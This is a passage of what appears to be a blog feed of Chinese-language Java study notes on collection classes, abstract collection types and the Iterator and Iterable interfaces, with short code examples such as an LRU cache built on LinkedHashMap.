class="params">(Map.Entry&lt;K, V&gt; eldest)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size() &gt; <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><p>另外，还可以对 eldest 条目进行评估，以此决定是否应该将它删除。 例如，可以检査与这个条目一起存在的时间戳。</p><blockquote><ul><li>LinkedHashSet()</li><li>LinkedHashSet(int initialCapacity)</li><li>LinkedHashSet(int initialCapacity, float loadFactor)<br>用给定的容量和填充因子构造一个空链接散列集。</li></ul></blockquote><h3 id="EmumSet"><a href="#EmumSet" class="headerlink" title="EmumSet"></a>EmumSet</h3><p>EmimSet 是一个枚举类型元素集的高效实现。 由于枚举类型只有有限个实例， 所以EnumSet 内部用位序列实现。如果对应的值在集中， 则相应的位被置为 1。</p><p>EnumSet 类没有公共的构造器。可以使用静态工厂方法构造这个集：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Weekday &#123; MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY, SUNDAY &#125;;</span><br><span class="line">EnumSet&lt;Weekday&gt; always = EnumSet.allOf(Weekday<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">EnumSet&lt;Weekday&gt; never = EnumSet.noneOf(Weekday<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">EnumSet&lt;Weekday&gt; workday = EnumSet.range(Weekday.MONDAY, Weekday.FRIDAY);</span><br><span class="line">EnumSet&lt;Weekday&gt; mwf = EnumSet.of(Weekday.MONDAY, Weekday.WEDNESDAY, Weekday.FRIDAY);</span><br></pre></td></tr></table></figure><p>可以使用 Set 接口的常用方法来修改 EnumSet。</p><blockquote><ul><li>static &lt; E extends Enum<E>&gt;EnumSet<E> allOf(Class<E> enumType)<br>返回一个包含给定枚举类型的所有值的集。</li><li>static &lt; E extends Enum<E>&gt; EnumSet<E> noneOf(Class&lt; E&gt; enumType)<br>返回一个空集，并有足够的空间保存给定的枚举类型所有的值。</li><li>static &lt; E extends Enum<E>&gt; EnumSet<E> range(E from, E to)<br>返回一个包含 from 〜 to 之间的所有值（包括两个边界元素）的集。</li><li>static &lt; E extends Enum<E>&gt; EnumSet<E> of(E value)</li><li>static &lt;E extends Enum<E>&gt; EnumSet<E> of(E value, E… values)<br>返回包括给定值的集。</li></ul></blockquote><h3 id="hashmap"><a href="#hashmap" class="headerlink" title="hashmap"></a>hashmap</h3><p>key不可以重复，value可以重复。它根据键的hashCode值存储数据，大多数情况下可以直接定位到它的值，因而具有很快的访问速度，<strong>但遍历顺序却是不确定的</strong>。 <strong>HashMap最多只允许一条记录的键为null，允许多条记录的值为null。HashMap非线程安全</strong>，即任一时刻可以有多个线程同时写HashMap，可能会导致数据的不一致。如果需要满足线程安全，可以用 Collections的synchronizedMap方法使HashMap具有线程安全的能力，或者使用ConcurrentHashMap。</p><blockquote><p>//遍历</p><p>staff.forEach((k, v) -&gt;<br>System.out.println(“key=” + k + “ value:” + v));</p><p>• HashMap()<br>• HashMap(int initialCapacity)<br>• HashMap(int initialCapacity, float loadFactor)<br>用给定的容量和装填因子构造一个空散列映射（装填因子是一个 0.0 〜 1.0 之间的数<br>值。这个数值决定散列表填充的百分比。一旦到了这个比例， 就要将其再散列到更大<br>的表中）。默认的装填因子是 0.75。</p></blockquote><h3 id="treemap"><a href="#treemap" class="headerlink" title="treemap"></a>treemap</h3><p>TreeMap实现SortedMap接口，能够把它保存的记录根据键排序，<strong>默认是按键值的升序排序，也可以指定排序的比较器</strong>，当用Iterator遍历TreeMap时，得到的记录是排过序的。如果使用排序的映射，建议使用TreeMap。在使用TreeMap时，key必须实现Comparable接口或者在构造TreeMap传入自定义的Comparator，否则会在运行时抛出java.lang.ClassCastException类型的异常。</p><blockquote><p>• TreeMap()<br>为实现 Comparable 接口的键构造一个空的树映射。<br>• TreeMap(Comparator&lt;? super K&gt; c)<br>构造一个树映射， 并使用一个指定的比较器对键进行排序。<br>• TreeMap(Map&lt;? extends K , ? extends V&gt; entries)<br>构造一个树映射， 并将某个映射中的所有条目添加到树映射中。<br>• TreeMap(SortedMap&lt;? extends K, ? extends V&gt; entries)<br>构造一个树映射， 将某个有序映射中的所有条目添加到树映射中， 并使用与给定的有序映射相同的比较器。</p></blockquote><h3 id="EnumMap"><a href="#EnumMap" class="headerlink" title="EnumMap"></a>EnumMap</h3><p>EnumMap 是一个键类型为枚举类型的映射。 它可以直接且高效地用一个值数组实现。在使用时， 需要在构造器中指定键类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EnumMap&lt;Weekday, Employee〉personlnCharge = <span class="keyword">new</span> EnumMapo(Weekday<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>EnumMap(Class<K> keyType)<br>构造一个键为给定类型的空映射。</p></blockquote><h3 id="linkedhashmap"><a href="#linkedhashmap" class="headerlink" title="linkedhashmap"></a>linkedhashmap</h3><p>LinkedHashMap是HashMap的一个子类，<strong>保存了记录的插入顺序</strong>，在用Iterator遍历LinkedHashMap时，先得到的记录肯定是先插入的，也可以在构造时带参数，按照访问次序排序。</p><p>链接散列映射将用访问顺序， 而不是插入顺序， 对映射条目进行迭代。每次调用 get 或 put, 受到影响的条目将从当前的位置删除， 并放到条目链表的尾部（只有条目在链表中的位置会受影响， 而散列表中的桶不会受影响。一个条目总位于与键散列码对应的桶中）。要项构造这样一个的散列映射表， 请调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashMap&lt;K, V&gt;(initialCapacity, loadFactor, <span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>访问顺序对于实现高速缓存的“ 最近最少使用” 原则十分重要。例如， 可能希望将访问<br>频率高的元素放在内存中， 而访问频率低的元素则从数据库中读取。当在表中找不到元素项<br>且表又已经满时， 可以将迭代器加入到表中， 并将枚举的前几个元素删除掉。这些是近期最<br>少使用的几个元素。<br>甚至可以让这一过程自动化。即构造一个<code>LinkedHashMap</code> 的子类，然后覆盖下面这个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry&lt;K， V&gt; eldest)</span></span></span><br></pre></td></tr></table></figure><p>每当方法返回 <code>true</code> 时， 就添加一个新条目，从而导致删除 <code>eldest</code> 条目。例如，下面的高<br>速缓存可以存放 100 个元素：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;K, V&gt; cache = <span class="keyword">new</span></span><br><span class="line">  LinkedHashMap&lt;&gt;(<span class="number">128</span>, <span class="number">0.75F</span>, <span class="keyword">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry&lt;K, V&gt; eldest)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size() &gt; <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><p>另外，还可以对 eldest 条目进行评估，以此决定是否应该将它删除。 例如，可以检査与这个条目一起存在的时间戳。</p><blockquote><ul><li>LinkedHashMap()</li><li>LinkedHashMap(int initialCapacity)</li><li>LinkedHashMap(int initialCapacity, float loadFactor)</li><li>LinkedHashMap(int initialCapacity, float loadFactor, boolean accessOrder)<br>用给定的容量、 填充因子和顺序构造一个空的链接散列映射表。accessOrder 参数为 true 时表示访问顺序， 为 false 时表示插入顺序。</li><li>protected boolean removeEldestEntry(Map.Entry&lt;K, V &gt; eldest)<br>如果想删除 eldest 元素， 并同时返回 true, 就应该覆盖这个方法。eldest 参数是预期要删除的条目。这个方法将在条目添加到映射中之后调用。其默认的实现将返回 false。即在默认情况下，旧元素没有被删除。然而， 可以重新定义这个方法， 以便有选择地返回 true。例如， 如果最旧的条目符合一个条件， 或者映射超过了一定大小， 则返回true。</li></ul></blockquote><h3 id="WeakHashMap"><a href="#WeakHashMap" class="headerlink" title="WeakHashMap"></a>WeakHashMap</h3><p>设计 WeakHashMap 类是为了解决一个有趣的问题。 如果有一个值，对应的键已经不再使用了， 将会出现什么情况呢？ 假定对某个键的最后一次引用已经消亡，不再有任何途径引用这个值的对象了。但是， 由于在程序中的任何部分没有再出现这个键， 所以， 这个键 / 值对无法从映射中删除。为什么垃圾回收器不能够删除它呢？ 难道删除无用的对象不是垃圾回收器的工作吗？<br>遗憾的是， 事情没有这样简单。 垃圾回收器跟踪活动的对象。只要映射对象是活动的，其中的所有桶也是活动的， 它们不能被回收。 因此， 需要由程序负责从长期存活的映射表中删除那些无用的值。 或者使用WeakHashMap 完成这件事情。 当对键的唯一引用来自散列条目时， 这一数据结构将与垃圾回收器协同工作一起删除键 / 值对。<br>下面是这种机制的内部运行情况。WeakHashMap 使用弱引用 （weak references) 保存键。WeakReference 对象将引用保存到另外一个对象中， 在这里， 就是散列键。 对于这种类型的对象， 垃圾回收器用一种特有的方式进行处理。通常， 如果垃圾回收器发现某个特定的对象已经没有他人引用了， 就将其回收。然而， 如果某个对象只能由 WeakReference 引用， 垃圾回收器仍然回收它，但要将引用这个对象的弱引用放人队列中。WeakHashMap 将周期性地检查队列， 以便找出新添加的弱引用。一个弱引用进人队列意味着这个键不再被他人使用， 并且已经被收集起来。于是， WeakHashMap 将删除对应的条目。</p><blockquote><ul><li>WeakHashMap()</li><li>WeakHashMap(int initialCapacity)</li><li>WeakHashMap(int initialCapacity, float loadFactor)<br>用给定的容量和填充因子构造一个空的散列映射表。</li></ul></blockquote><h3 id="IdentifyHashMap"><a href="#IdentifyHashMap" class="headerlink" title="IdentifyHashMap"></a>IdentifyHashMap</h3><p>类 IdentityHashMap 有特殊的作用。 在这个类中， 键的散列值不是用 hashCode 函数计算的， 而是用 System.identityHashCode 方法计算的。 这是 Object.hashCode 方法根据对象的内存地址来计算散列码时所使用的方式。 而且， 在对两个对象进行比较时， IdentityHashMap 类使用 ==, 而不使用 equals。<br>也就是说， 不同的键对象， 即使内容相同， 也被视为是不同的对象。 在实现对象遍历算法 （如对象串行化）时， 这个类非常有用， 可以用来跟踪每个对象的遍历状况。</p><blockquote><ul><li>IdentityHashMap()</li><li>IdentityHashMap(int expectedMaxSize)<br>构造一个空的标识散列映射集，其容量是大于 1.5 * expectedMaxSize 的 2 的最小次幂<br>(expectedMaxSize 的默认值是 21 )。</li></ul></blockquote><h3 id="ArrayDeque"><a href="#ArrayDeque" class="headerlink" title="ArrayDeque"></a>ArrayDeque</h3><p>数组实现双端队列，实现了Deque接口，链表实现是linkedlist。</p><blockquote><p>• ArrayDeque( )<br>• ArrayDeque( 1nt initialCapacity)</p><p>用初始容量 16 或给定的初始容量构造一个无限双端队列。</p></blockquote><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>优先级队列</p><blockquote><p>• PriorityQueue()<br>• PriorityQueue(int initialCapacity)<br>构造一个用于存放 Comparable 对象的优先级队列。<br>• Pr1orityQueue(int initialCapacity, Comparator &lt;? super E&gt; c)<br>构造一个优先级队列， 并用指定的比较器对元素进行排序。</p></blockquote><h3 id="集合工具类"><a href="#集合工具类" class="headerlink" title="集合工具类"></a>集合工具类</h3><p>Collections:集合框架的工具类。里面定义的都是静态方法。</p><p>Collections和Collection有什么区别？<br>Collection是集合框架中的一个顶层接口，它里面定义了单列集合的共性方法。<br>Collections是集合框架中的一个工具类，就如同Arrays是数组的工具类，该类中的方法都是静态的。<br>提供的方法中有可以对list集合进行排序，二分查找等方法。<br>通常常用的集合都是线程不安全的。因为要提高效率。<br>如果多线程操作这些集合时，可以通过该工具类中的同步方法，将线程不安全的集合，转换成安全的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Collections.reverse(numbers);<span class="comment">//使list中的数据反转</span></span><br><span class="line">Collections.shuffle(numbers);<span class="comment">//混淆list中的数据</span></span><br><span class="line">Collections.sort(numbers); <span class="comment">//排序</span></span><br><span class="line">Collections.swap(numbers,<span class="number">0</span>,<span class="number">5</span>);<span class="comment">//交换</span></span><br><span class="line">Collections.rotate(numbers,<span class="number">2</span>);<span class="comment">//滚动，向右滚动指定的单位长度</span></span><br><span class="line">List&lt;Integer&gt; synchronizedNumbers = (List&lt;Integer&gt;) Collections.synchronizedList(numbers);</span><br><span class="line"><span class="comment">//把非线程安全的List转换为线程安全的List</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA集合复习-抽象类</title>
      <link href="/2020/12/04/javajihe_chouxiang/"/>
      <url>/2020/12/04/javajihe_chouxiang/</url>
      
        <content type="html"><![CDATA[<blockquote><p>java集合抽象类</p></blockquote><a id="more"></a><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><h3 id="abstractcollection"><a href="#abstractcollection" class="headerlink" title="abstractcollection"></a>abstractcollection</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCollection</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt;</span></span><br></pre></td></tr></table></figure><p>AbstractCollection是一个抽象类，它实现了Collection中除iterator()和size()之外的函数。<br>AbstractCollection的主要作用：它实现了Collection接口中的大部分函数。从而方便其它类实现Collection，比如ArrayList、LinkedList等，它们这些类想要实现Collection接口，通过继承AbstractCollection就已经实现了大部分的接口了。</p><h3 id="abstractlist"><a href="#abstractlist" class="headerlink" title="abstractlist"></a>abstractlist</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractCollection</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;</span></span><br></pre></td></tr></table></figure><p>AbstractList是一个继承于AbstractCollection，并且实现List接口的抽象类。它实现了List中除size()、get(int location)之外的函数。<br>AbstractList的主要作用：它实现了List接口中的大部分函数。从而方便其它类继承List。<br>另外，和AbstractCollection相比，AbstractList抽象类中，实现了iterator()接口。</p><h3 id="abstractset"><a href="#abstractset" class="headerlink" title="abstractset"></a>abstractset</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractSet</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractCollection</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;</span></span><br></pre></td></tr></table></figure><p>AbstractSet是一个继承于AbstractCollection，并且实现Set接口的抽象类。由于Set接口和Collection接口中的API完全一样，Set也就没有自己单独的API。和AbstractCollection一样，它实现了List中除iterator()和size()之外的函数。<br>AbstractSet的主要作用：它实现了Set接口中的大部分函数。从而方便其它类实现Set接口。</p><h3 id="abstractmap"><a href="#abstractmap" class="headerlink" title="abstractmap"></a>abstractmap</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对应于<code>AbstractCollection</code>，<code>AbstractMap</code>的作用也是类似的，主要是针对 Map 提供一些方法的通用实现。如果需要实现一个<strong>不可修改的 Map</strong>，只需要继承 AbstractMap 并重写 entrySet 方法。entrySet 方法返回的 Set 集合不应该支持 add、remove 方法，其迭代器也不应该支持 remove 方法。要实现<strong>可修改的 Map</strong>，必须重写此类的 put 方法（AbstractMap 默认抛出 UnsupportedOperationException 异常）和 entrySet 方法。iterator 方法返回的迭代器必须实现 remove 方法。</p><p>entrySet 方法在 AbstractMap 中仍然是一个抽象方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> Set&lt;Entry&lt;K,V&gt;&gt; entrySet();</span><br></pre></td></tr></table></figure><p>另外在 AbstractMap 中定义了两个变量，这两个变量在 AbstractMap 的子类 HashMap、TreeMap 都有用到。被用来存储返回的集合视图。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储 key 集合</span></span><br><span class="line"><span class="keyword">transient</span> Set&lt;K&gt;        keySet;</span><br><span class="line"><span class="comment">// 存储 values</span></span><br><span class="line"><span class="keyword">transient</span> Collection&lt;V&gt; values;</span><br></pre></td></tr></table></figure><h3 id="abstractsequentiallist"><a href="#abstractsequentiallist" class="headerlink" title="abstractsequentiallist"></a>abstractsequentiallist</h3><p>（ Sequential 相继的，按次序的）</p><p>AbstractSequentialList 继承自 <a href="http://blog.csdn.net/u012426327/article/details/77504085" target="_blank" rel="noopener">AbstractList</a>，是 <code>LinkedList</code> 的父类，是 <a href="http://blog.csdn.net/u012426327/article/details/77504027" target="_blank" rel="noopener">List 接口</a> 的简化版实现。</p><p>简化在哪儿呢？简化在 AbstractSequentialList 只支持按次序访问，而不像 <a href="http://blog.csdn.net/u012426327/article/details/77504085" target="_blank" rel="noopener">AbstractList</a> 那样支持随机访问。</p><p>想要实现一个支持按次序访问的 List的话，只需要继承这个抽象类，然后把指定的抽象方法实现就好了。需要实现的方法：</p><ul><li>size()</li><li>listIterator()，返回一个 ListIterator</li></ul><p>你需要实现一个 <code>ListIterator</code>, 实现它的 <code>hasNext()</code>, <code>hasPrevious()</code>, <code>next()</code>, <code>previous()</code>, 还有那几个 获取位置 的方法，这样你就得到一个不可变的 ListIterator 了。如果你想让它可修改，还需要实现 <code>add()</code>, <code>remove()</code>, <code>set()</code> 方法。</p><p>正如在 每个 <a href="http://blog.csdn.net/u012426327/article/details/77503961" target="_blank" rel="noopener">Collection 接口</a> 中提倡的那样，AbstractSequentialList 的子类需要提供两个构造函数，一个无参，一个以 Collection 为参数。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA集合复习-接口</title>
      <link href="/2020/12/03/javajihe_jiekou/"/>
      <url>/2020/12/03/javajihe_jiekou/</url>
      
        <content type="html"><![CDATA[<blockquote><p>java集合</p></blockquote><a id="more"></a><h2 id="一：总览"><a href="#一：总览" class="headerlink" title="一：总览"></a>一：总览</h2><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203194831354.png" alt="image-20201203194831354"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203194807291.png" alt="image-20201203194807291"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203205940772.png" alt="image-20201203205940772"></p><p>上述类图中，实线边框的是实现类，比如ArrayList，LinkedList，HashMap等，折线边框的是抽象类，比如AbstractCollection，AbstractList，AbstractMap等，而点线边框的是接口，比如Collection，Iterator，List等。</p><p>主要接口：iterator，listiterator(图片有错误)，collection，map，list，set，queue，sortedmap，sortedset……</p><p>抽象类：abstractcollection，abstractlist，abstractset，abstractmap，abstractsequentiallist</p><p>实现类（主要掌握）：arraylist，linkedlist，hashset，treeset，linkedhashset，hashmap，treemap，linkedhashmap。</p><h2 id="二：详解"><a href="#二：详解" class="headerlink" title="二：详解"></a>二：详解</h2><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201206142132130.png" alt="image-20201206142132130"></p><h4 id="iterator接口"><a href="#iterator接口" class="headerlink" title="iterator接口"></a>iterator接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">next</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//请求一个迭代器</span></span><br><span class="line">Collection&lt;String&gt; c = . . .;</span><br><span class="line">Iterator&lt;String&gt; iter = c.iteratorO；</span><br><span class="line"><span class="keyword">while</span> (iter.hasNextO)</span><br><span class="line">&#123;</span><br><span class="line">String element = iter.next0；</span><br><span class="line"><span class="keyword">do</span> something with element</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用for each 必须实现Iterable接口</span></span><br><span class="line"><span class="keyword">for</span> (String element : c)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> something with element</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用lambda表达式</span></span><br><span class="line">iterator.forEachRemaining(element -&gt; dosomething with element);</span><br></pre></td></tr></table></figure><blockquote><p>• boolean hasNext()<br>如果存在可访问的元素， 返回 true。<br>• E next()<br>返回将要访问的下一个对象。 如果已经到达了集合的尾部， 将拋出一个 NoSuchElementException。<br>• void remove( )<br>删除上次访问的对象。这个方法必须紧跟在访问一个元素之后执行。如果上次访问之后，集合已经发生了变化， 这个方法将抛出一个 IllegalStateException。</p></blockquote><p>iterator 接口的 remove 方法将会删除上次调用 next 方法时返回的元素。</p><p>只能向前遍历，无法反向。</p><p>应该将 Java 迭代器认为是位于两个元素之间。 当调用 next 时，迭代器就越过下<br>一个元素，并返回刚刚越过的那个元素的引用。</p><h4 id="Iterable接口"><a href="#Iterable接口" class="headerlink" title="Iterable接口"></a>Iterable接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Iterable</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">Iterator&lt;T&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有的集合类（List、Set…）都实现自Collection 接口，而Collection 接口又继承于Iterable 接口，因此可以说所有的集合类（List、Set…）都实现了Iterable 接口。</p><p>当某个类实现Iterable接口时，我们就能称这个类是一个“可数”的类，也就是可以使用<code>iterator()</code>获取一个迭代器Iterator，然后使用这个Iterator实例去遍历这个类，因此所有的Collection类都能够使用迭代器Iterator来遍历。</p><p>如果某个类实现了Iterable 接口，那么他也需要创建一个内部类去实现一个Iterator 类，让调用Iterable 接口中的iterator() 时，能够获取到一个iterator 实例。</p><p>而再进一步说，当某个类能使用迭代器Iterator来遍历时，就能使用java提供的foreach语法糖来遍历此类（foreach语法糖其实就是简化的<code>iterator()</code>）</p><p>foreach实际上会被编译器编译成使用迭代器<code>iterator()</code>去遍历集合，因此能使用foreach的，都是得实现Iterable接口的集合类Collection们，像是List、Set</p><p>所以Map就没有办法直接使用foreach（因为Map没有实现Iterable接口），只有他的<code>map.entrySet()</code>、<code>map.keySet()</code>、<code>map.values()</code>这种返回一个集合类的方法，才能使用foreach。</p><ul><li><p>为什么Iterator 要额外使用内部类去实现，而不是ArrayList 直接实现此接口 ?</p><ul><li><p>如果看过Collection类的源码（以ArrayList为例），可以发现ArrayList类并不是由ArrayList去实现Iterator接口，而是ArrayList有一个内部类Itr，专门去实现Iterator接口，而ArrayList的<code>iterator()</code>方法，只是去创建一个内部类ArrayList.Itr的实例而已</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ArrayList不實現Iterator接口，反而是由他的內部類進行實現</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">//調用list.iterator()可以取得此list的迭代器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Itr(); <span class="comment">//實際上就是去創建一個內部類的實例</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ArrayList中的內部類Itr，專門實現Iterator接口</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cursor; <span class="comment">//記錄當前迭代到哪裡</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>要这样设计是因为一个集合类可能同时有多个迭代器去遍历他，而每个迭代器遍历到集合的哪里，是每个迭代器自己的事情，彼此不互相干涉，因此才需要额外使用一个内部类去实现迭代器的Iterator 接口</p><ul><li>如此当需要用到Iterator来遍历集合时，只需要调用<code>list.iterator()</code>，就能取得一个全新的、不受别人影响的迭代器供自己使用，而迭代器彼此之间也不会互相干涉</li><li>至于为什么要特别使用内部类来实现Iterator接口，而不是创建一个Iterator公共类来供所有集合一起使用，是因为迭代器需要知道集合的内部结构，他才能知道要怎么去实现<code>hasNext()</code>、<code>next()</code>、<code>remove()</code>方法，而使用内部类才能无条件的取用外部类的所有信息（包含private的变量和方法），因此才需要将Iterator提取成接口，让每个集合自己使用内部类去实现Iterator接口</li></ul></li></ul></li><li><p>为什么Iterator接口，只有<code>hasNext()</code>、<code>next()</code>、<code>remove()</code>方法，而没有<code>add(E)</code>方法?</p><ul><li>逻辑上来说，迭代器是一个一个去遍历集合中的元素，而当前iterator 停下的地方，就是迭代到一半的地方<ul><li>如果当迭代到一半时调用<code>iterator.add()</code>方法，理论上来说，应该是要在当前这个元素E1后面新增一个元素E2，使得下次遍历此集合时，E2一定会出现在E1后面，也就是[….E1 , E2, ….]</li><li>假设<code>add()</code>方法是以这个语意为前提的话，那么迭代器不提供此方法是很合理的，对于有序的集合（像是ArrayList）来说，在此元素后面新增一个元素是一个很简单的事情，但是对于无序的集合（像是HashSet）来说，不能保证新插入的这个元素E2一定会在E1后面（因为还得计算HashCode），如此就违反了<code>add()</code>的语意了，这也就是为什么Iterator接口不提供<code>add()</code>方法</li></ul></li><li>另一个说法是，在使用迭代器时，通常就是“遍历”的场景，这种场景下很少会去使用<code>add()</code>方法，因此Iterator接口没必要提供这个方法</li></ul></li></ul><h4 id="listiterator接口"><a href="#listiterator接口" class="headerlink" title="listiterator接口"></a>listiterator接口</h4><blockquote><p>参考：<a href="https://www.yiibai.com/java/java-listiterator.html" target="_blank" 